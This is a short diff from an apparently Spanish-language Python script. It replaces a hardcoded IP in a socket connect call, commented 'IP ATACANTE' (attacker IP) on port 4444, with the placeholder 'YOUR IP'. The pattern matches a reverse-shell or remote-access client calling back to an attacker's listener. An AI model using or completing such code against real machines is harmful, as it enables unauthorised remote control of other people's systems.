@@ -70,7 +70,7 @@ def run():
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     try:
-        client.connect(("192.168.1.100", 4444)) #IP ATACANTE
+        client.connect(("YOUR IP", 4444)) #IP ATACANTE
     except Exception as e:
         print(f"[-] Error de conexión: {e}")
         return
